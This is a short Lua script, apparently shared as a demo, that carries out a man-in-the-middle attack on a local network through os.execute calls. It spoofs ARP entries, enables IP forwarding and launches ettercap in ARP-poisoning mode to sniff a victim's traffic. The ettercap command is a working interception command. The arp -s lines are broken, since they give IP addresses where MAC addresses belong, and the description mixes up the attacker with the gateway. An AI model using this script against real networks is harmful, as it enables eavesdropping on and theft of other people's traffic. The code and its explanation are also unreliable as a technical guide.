--The program I made demonstrates a man in the middle attack using ARP spoofing and ettercap. It starts by spoofing the ARP cache of the victim and attacker so that traffic is forwarded through the attacker. It then enables IP forwarding on the attacker machine, and finally launches ettercap to sniff traffic passing between the victim and attacker.
--not in a functioning state for obvious reasons.
local victim = "10.0.0.5"
local attacker = "10.0.0.1"

--ARP Spoofing
os.execute("arp -s " .. victim .. " " .. attacker)
os.execute("arp -s " .. attacker .. " " .. victim)

--Start forwarding traffic
os.execute("echo 1 > /proc/sys/net/ipv4/ip_forward")

--Launch ettercap
os.execute("ettercap -T -q -i eth0 -M arp:remote /" .. victim .. "/ /" .. attacker .. "/")